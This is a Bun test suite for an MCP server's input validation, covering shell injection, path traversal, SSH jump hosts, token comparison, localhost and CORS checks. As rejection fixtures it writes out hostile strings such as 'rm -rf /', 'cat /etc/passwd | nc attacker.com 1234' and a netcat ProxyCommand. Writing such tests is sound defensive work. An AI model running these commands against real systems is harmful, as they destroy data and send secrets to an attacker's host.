/**
 * MCP Server Security Tests
 *
 * Tests for shell injection prevention, input validation, and command whitelisting.
 */

import { describe, expect, test } from "bun:test";
import { timingSafeEqual } from "node:crypto";
import {
  SafeText,
  SafePath,
  SafePort,
  SafePassthroughArg,
  ContentText,
  QueryInput,
  CheckInput,
  FileAddInput,
  IssueInput,
  SessionInput,
  ApproveInput,
  PassthroughInput,
  validateInput,
} from "../src/mcp-validation";

// ============================================================================
// Shell Injection Prevention Tests
// ============================================================================

describe("SafeText - Shell Metacharacter Rejection", () => {
  const shellMetachars = [
    { char: "`", name: "backtick" },
    { char: "$", name: "dollar" },
    { char: "(", name: "open paren" },
    { char: ")", name: "close paren" },
    { char: "{", name: "open brace" },
    { char: "}", name: "close brace" },
    { char: "|", name: "pipe" },
    { char: ";", name: "semicolon" },
    { char: "&", name: "ampersand" },
    { char: "<", name: "less than" },
    { char: ">", name: "greater than" },
    { char: "\\", name: "backslash" },
  ];

  for (const { char, name } of shellMetachars) {
    test(`rejects ${name} (${char})`, () => {
      const result = SafeText.safeParse(`normal text ${char} more text`);
      expect(result.success).toBe(false);
    });
  }

  test("accepts normal text without shell metacharacters", () => {
    const result = SafeText.safeParse("This is normal text with no special chars");
    expect(result.success).toBe(true);
  });

  test("accepts text with safe punctuation", () => {
    const result = SafeText.safeParse("Hello, world! How are you? I'm fine.");
    expect(result.success).toBe(true);
  });
});

describe("SafePath - Path Traversal Prevention", () => {
  test("rejects path traversal with ..", () => {
    const result = SafePath.safeParse("../../../etc/passwd");
    expect(result.success).toBe(false);
  });

  test("rejects hidden path traversal", () => {
    const result = SafePath.safeParse("foo/../../../etc/passwd");
    expect(result.success).toBe(false);
  });

  test("rejects URL-encoded path traversal (%2e%2e)", () => {
    const result = SafePath.safeParse("%2e%2e/%2e%2e/etc/passwd");
    expect(result.success).toBe(false);
  });

  test("rejects mixed URL-encoded path traversal", () => {
    const result = SafePath.safeParse("foo/%2e%2e/%2e%2e/etc/passwd");
    expect(result.success).toBe(false);
  });

  test("rejects shell metacharacters in paths", () => {
    const result = SafePath.safeParse("path/$(whoami)/file");
    expect(result.success).toBe(false);
  });

  test("accepts normal relative paths", () => {
    const result = SafePath.safeParse("src/components/Button.tsx");
    expect(result.success).toBe(true);
  });

  test("accepts absolute paths", () => {
    const result = SafePath.safeParse("/opt/muninn/src/index.ts");
    expect(result.success).toBe(true);
  });
});

describe("SafePort - Port Number Validation", () => {
  test("accepts valid port 1", () => {
    const result = SafePort.safeParse(1);
    expect(result.success).toBe(true);
    expect(result.success && result.data).toBe(1);
  });

  test("accepts valid port 65535", () => {
    const result = SafePort.safeParse(65535);
    expect(result.success).toBe(true);
    expect(result.success && result.data).toBe(65535);
  });

  test("accepts common port 3333", () => {
    const result = SafePort.safeParse(3333);
    expect(result.success).toBe(true);
  });

  test("coerces string to number", () => {
    const result = SafePort.safeParse("8080");
    expect(result.success).toBe(true);
    expect(result.success && result.data).toBe(8080);
  });

  test("rejects port 0", () => {
    const result = SafePort.safeParse(0);
    expect(result.success).toBe(false);
  });

  test("rejects port 65536", () => {
    const result = SafePort.safeParse(65536);
    expect(result.success).toBe(false);
  });

  test("rejects negative port", () => {
    const result = SafePort.safeParse(-1);
    expect(result.success).toBe(false);
  });

  test("rejects NaN", () => {
    const result = SafePort.safeParse("abc");
    expect(result.success).toBe(false);
  });

  test("rejects float", () => {
    const result = SafePort.safeParse(3333.5);
    expect(result.success).toBe(false);
  });
});

describe("SafePassthroughArg - Argument Validation", () => {
  test("accepts normal argument", () => {
    const result = SafePassthroughArg.safeParse("status");
    expect(result.success).toBe(true);
  });

  test("accepts argument with spaces", () => {
    const result = SafePassthroughArg.safeParse("some text with spaces");
    expect(result.success).toBe(true);
  });

  test("accepts argument with hyphens and underscores", () => {
    const result = SafePassthroughArg.safeParse("--some-flag_value");
    expect(result.success).toBe(true);
  });

  test("accepts numeric argument", () => {
    const result = SafePassthroughArg.safeParse("12345");
    expect(result.success).toBe(true);
  });

  test("rejects semicolon (command chaining)", () => {
    const result = SafePassthroughArg.safeParse("status; rm -rf /");
    expect(result.success).toBe(false);
  });

  test("rejects pipe", () => {
    const result = SafePassthroughArg.safeParse("status | nc attacker.com");
    expect(result.success).toBe(false);
  });

  test("rejects ampersand", () => {
    const result = SafePassthroughArg.safeParse("status && whoami");
    expect(result.success).toBe(false);
  });

  test("rejects backtick", () => {
    const result = SafePassthroughArg.safeParse("`whoami`");
    expect(result.success).toBe(false);
  });

  test("rejects command substitution", () => {
    const result = SafePassthroughArg.safeParse("$(whoami)");
    expect(result.success).toBe(false);
  });

  test("rejects argument over 500 chars", () => {
    const result = SafePassthroughArg.safeParse("a".repeat(501));
    expect(result.success).toBe(false);
  });
});

// ============================================================================
// Tool Input Validation Tests
// ============================================================================

describe("QueryInput Validation", () => {
  test("validates valid query input", () => {
    const result = validateInput(QueryInput, {
      query: "search for authentication",
      smart: true,
    });
    expect(result.success).toBe(true);
  });

  test("rejects query with shell injection attempt", () => {
    const result = validateInput(QueryInput, {
      query: "$(whoami)",
    });
    expect(result.success).toBe(false);
    expect(result.success === false && result.error).toContain("dangerous characters");
  });

  test("rejects query with command substitution", () => {
    const result = validateInput(QueryInput, {
      query: "`cat /etc/passwd`",
    });
    expect(result.success).toBe(false);
  });
});

describe("CheckInput Validation", () => {
  test("validates valid file list", () => {
    const result = validateInput(CheckInput, {
      files: ["src/index.ts", "src/mcp-server.ts"],
    });
    expect(result.success).toBe(true);
  });

  test("rejects path traversal in files", () => {
    const result = validateInput(CheckInput, {
      files: ["../../../etc/passwd"],
    });
    expect(result.success).toBe(false);
    expect(result.success === false && result.error).toContain("traversal");
  });

  test("rejects empty files array", () => {
    const result = validateInput(CheckInput, {
      files: [],
    });
    expect(result.success).toBe(false);
  });

  test("rejects too many files", () => {
    const result = validateInput(CheckInput, {
      files: Array(51).fill("file.ts"),
    });
    expect(result.success).toBe(false);
    expect(result.success === false && result.error).toContain("max 50");
  });
});

describe("FileAddInput Validation", () => {
  test("validates valid file add input", () => {
    const result = validateInput(FileAddInput, {
      path: "src/components/Button.tsx",
      purpose: "React button component with variants",
      fragility: 3,
    });
    expect(result.success).toBe(true);
  });

  test("rejects fragility out of range", () => {
    const result = validateInput(FileAddInput, {
      path: "src/index.ts",
      purpose: "Entry point",
      fragility: 15,
    });
    expect(result.success).toBe(false);
  });

  test("rejects invalid type format", () => {
    const result = validateInput(FileAddInput, {
      path: "src/index.ts",
      purpose: "Entry point",
      fragility: 5,
      type: "INVALID_TYPE_123",
    });
    expect(result.success).toBe(false);
  });
});

describe("IssueInput Validation (Discriminated Union)", () => {
  test("validates add action", () => {
    const result = validateInput(IssueInput, {
      action: "add",
      title: "Fix authentication bug",
      severity: 7,
      type: "security",
    });
    expect(result.success).toBe(true);
  });

  test("validates resolve action", () => {
    const result = validateInput(IssueInput, {
      action: "resolve",
      id: 42,
      resolution: "Fixed by updating the token validation logic",
    });
    expect(result.success).toBe(true);
  });

  test("rejects shell injection in issue title", () => {
    const result = validateInput(IssueInput, {
      action: "add",
      title: "$(rm -rf /)",
      severity: 5,
    });
    expect(result.success).toBe(false);
  });

  test("rejects invalid severity", () => {
    const result = validateInput(IssueInput, {
      action: "add",
      title: "Minor bug",
      severity: 100,
    });
    expect(result.success).toBe(false);
  });
});

describe("SessionInput Validation", () => {
  test("validates start action", () => {
    const result = validateInput(SessionInput, {
      action: "start",
      goal: "Implement security hardening",
    });
    expect(result.success).toBe(true);
  });

  test("validates end action", () => {
    const result = validateInput(SessionInput, {
      action: "end",
      outcome: "Completed security review",
      success: 2,
    });
    expect(result.success).toBe(true);
  });

  test("rejects invalid success value", () => {
    const result = validateInput(SessionInput, {
      action: "end",
      success: 5,
    });
    expect(result.success).toBe(false);
  });
});

describe("ApproveInput Validation", () => {
  test("validates valid operation ID", () => {
    const result = validateInput(ApproveInput, {
      operationId: "op_abc123",
    });
    expect(result.success).toBe(true);
  });

  test("rejects invalid operation ID format", () => {
    const result = validateInput(ApproveInput, {
      operationId: "invalid-format",
    });
    expect(result.success).toBe(false);
  });

  test("rejects shell injection in operation ID", () => {
    const result = validateInput(ApproveInput, {
      operationId: "op_$(whoami)",
    });
    expect(result.success).toBe(false);
  });
});

describe("PassthroughInput Validation", () => {
  test("validates simple command", () => {
    const result = validateInput(PassthroughInput, {
      command: "status",
    });
    expect(result.success).toBe(true);
  });

  test("validates command with arguments", () => {
    const result = validateInput(PassthroughInput, {
      command: 'outcome record 5 succeeded "Fixed the bug"',
    });
    expect(result.success).toBe(true);
  });
});

// ============================================================================
// Content Length Tests
// ============================================================================

describe("Content Length Limits", () => {
  test("rejects SafeText over 1000 chars", () => {
    const longText = "a".repeat(1001);
    const result = SafeText.safeParse(longText);
    expect(result.success).toBe(false);
  });

  test("rejects SafePath over 500 chars", () => {
    const longPath = "a/".repeat(251);
    const result = SafePath.safeParse(longPath);
    expect(result.success).toBe(false);
  });

  test("rejects ContentText over 10000 chars", () => {
    const longContent = "a".repeat(10001);
    const result = ContentText.safeParse(longContent);
    expect(result.success).toBe(false);
  });

  test("accepts ContentText at limit", () => {
    const maxContent = "a".repeat(10000);
    const result = ContentText.safeParse(maxContent);
    expect(result.success).toBe(true);
  });
});

// ============================================================================
// Edge Cases
// ============================================================================

describe("Edge Cases", () => {
  test("rejects empty strings", () => {
    const result = SafeText.safeParse("");
    expect(result.success).toBe(false);
  });

  test("handles unicode safely", () => {
    const result = SafeText.safeParse("Hello world");
    expect(result.success).toBe(true);
  });

  test("rejects null/undefined", () => {
    expect(SafeText.safeParse(null).success).toBe(false);
    expect(SafeText.safeParse(undefined).success).toBe(false);
  });

  test("handles mixed injection attempts", () => {
    const result = validateInput(QueryInput, {
      query: "search && rm -rf / ; cat /etc/passwd | nc attacker.com 1234",
    });
    expect(result.success).toBe(false);
  });
});

// ============================================================================
// Timing-Safe Comparison Tests (H4)
// ============================================================================

describe("Timing-Safe Token Comparison", () => {
  /**
   * Helper function mimicking the web-server's safeTokenCompare
   */
  function safeTokenCompare(provided: string, expected: string): boolean {
    const providedBuf = Buffer.from(provided);
    const expectedBuf = Buffer.from(expected);

    if (providedBuf.length !== expectedBuf.length) {
      timingSafeEqual(expectedBuf, expectedBuf);
      return false;
    }

    return timingSafeEqual(providedBuf, expectedBuf);
  }

  test("returns true for matching tokens", () => {
    const token = "super-secret-api-token-12345678901234567890";
    expect(safeTokenCompare(token, token)).toBe(true);
  });

  test("returns false for different tokens of same length", () => {
    const token1 = "token-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const token2 = "token-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    expect(safeTokenCompare(token1, token2)).toBe(false);
  });

  test("returns false for different length tokens", () => {
    const short = "short";
    const long = "this-is-a-much-longer-token";
    expect(safeTokenCompare(short, long)).toBe(false);
    expect(safeTokenCompare(long, short)).toBe(false);
  });

  test("returns false for empty vs non-empty", () => {
    expect(safeTokenCompare("", "token")).toBe(false);
    expect(safeTokenCompare("token", "")).toBe(false);
  });

  test("handles special characters", () => {
    const token = "Bearer abc123-_=+/";
    expect(safeTokenCompare(token, token)).toBe(true);
  });
});

// ============================================================================
// SSH Path Validation Tests (H1)
// ============================================================================

describe("SSH Key Path Validation", () => {
  /**
   * SSH dangerous characters pattern from server.ts
   */
  const SSH_DANGEROUS_CHARS = /[`$(){}|;&<>\\'"!]/;

  test("rejects paths with shell metacharacters", () => {
    const dangerousPaths = [
      "~/.ssh/key$(whoami)",
      "~/.ssh/key`id`",
      "~/.ssh/key;rm -rf /",
      "~/.ssh/key|cat /etc/passwd",
      "~/.ssh/key&background",
      "~/.ssh/key'quoted'",
      '~/.ssh/key"double"',
    ];

    for (const path of dangerousPaths) {
      expect(SSH_DANGEROUS_CHARS.test(path)).toBe(true);
    }
  });

  test("accepts valid SSH key paths", () => {
    const validPaths = [
      "~/.ssh/id_ed25519",
      "~/.ssh/id_rsa",
      "~/.ssh/my-key",
      "~/.ssh/project_deploy_key",
    ];

    for (const path of validPaths) {
      expect(SSH_DANGEROUS_CHARS.test(path)).toBe(false);
    }
  });
});

// ============================================================================
// SSH Jump Host Validation Tests (H2)
// ============================================================================

describe("SSH Jump Host Validation", () => {
  /**
   * Valid jump host pattern from server.ts
   * Allows multiple hops with or without user@ prefix
   */
  const VALID_JUMP_HOST_PATTERN =
    /^([a-zA-Z0-9_.-]+@)?[a-zA-Z0-9.-]+(:\d+)?(,([a-zA-Z0-9_.-]+@)?[a-zA-Z0-9.-]+(:\d+)?)*$/;
  const SSH_DANGEROUS_CHARS = /[`$(){}|;&<>\\'"!]/;

  test("accepts valid jump host formats", () => {
    const validHosts = [
      "bastion.example.com",
      "user@bastion.example.com",
      "user@bastion.example.com:2222",
      "bastion.example.com:22",
      "jump1,jump2",
      "user@jump1.com,user@jump2.com",
      "user@jump1.com:22,user@jump2.com:2222",
    ];

    for (const host of validHosts) {
      expect(VALID_JUMP_HOST_PATTERN.test(host)).toBe(true);
      expect(SSH_DANGEROUS_CHARS.test(host)).toBe(false);
    }
  });

  test("rejects jump hosts with shell injection", () => {
    const dangerousHosts = [
      "host;rm -rf /",
      "host$(whoami)",
      "host`id`",
      "host|nc attacker 4444",
      'host -o ProxyCommand="nc attacker 4444"',
      "host&background",
    ];

    for (const host of dangerousHosts) {
      expect(SSH_DANGEROUS_CHARS.test(host)).toBe(true);
    }
  });

  test("rejects invalid jump host formats", () => {
    const invalidHosts = [
      "", // empty
      " ", // whitespace
      "host with space",
      "host\ttab",
      "host\nnewline",
    ];

    for (const host of invalidHosts) {
      const isValid = VALID_JUMP_HOST_PATTERN.test(host) && !SSH_DANGEROUS_CHARS.test(host);
      expect(isValid).toBe(false);
    }
  });
});

// ============================================================================
// Localhost Detection Tests (H3)
// ============================================================================

describe("Localhost Detection", () => {
  /**
   * Simulates the isLocalhostRequest logic from web-server.ts
   */
  function isLocalhostHost(host: string): boolean {
    return (
      host === "localhost" ||
      host.startsWith("localhost:") ||
      host === "127.0.0.1" ||
      host.startsWith("127.0.0.1:") ||
      host === "[::1]" ||
      host.startsWith("[::1]:")
    );
  }

  test("accepts valid localhost variations", () => {
    const validLocalhost = [
      "localhost",
      "localhost:3333",
      "127.0.0.1",
      "127.0.0.1:8080",
      "[::1]",
      "[::1]:3333",
    ];

    for (const host of validLocalhost) {
      expect(isLocalhostHost(host)).toBe(true);
    }
  });

  test("rejects spoofed localhost attempts", () => {
    const spoofedHosts = [
      "localhost.attacker.com",
      "localhost.evil.com:3333",
      "127.0.0.1.attacker.com",
      "127.0.0.1.evil.com:8080",
      "attacker.com",
      "192.168.1.1",
      "10.0.0.1:3333",
    ];

    for (const host of spoofedHosts) {
      expect(isLocalhostHost(host)).toBe(false);
    }
  });
});

// ============================================================================
// CORS Origin Tests (M7)
// ============================================================================

describe("CORS Origin Validation", () => {
  /**
   * Pattern from web-server.ts (updated to include IPv6)
   */
  const localhostPattern = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?$/;

  test("accepts localhost origins", () => {
    const validOrigins = [
      "http://localhost",
      "http://localhost:3000",
      "https://localhost",
      "https://localhost:8080",
      "http://127.0.0.1",
      "http://127.0.0.1:3333",
      "http://[::1]",
      "http://[::1]:8080",
    ];

    for (const origin of validOrigins) {
      expect(localhostPattern.test(origin)).toBe(true);
    }
  });

  test("rejects non-localhost origins", () => {
    const invalidOrigins = [
      "http://example.com",
      "http://localhost.attacker.com",
      "http://attacker.localhost.com",
      "http://192.168.1.1",
      "http://10.0.0.1:3000",
      "file://localhost",
      "http://localhost:",
      "http://localhost:abc",
    ];

    for (const origin of invalidOrigins) {
      expect(localhostPattern.test(origin)).toBe(false);
    }
  });
});
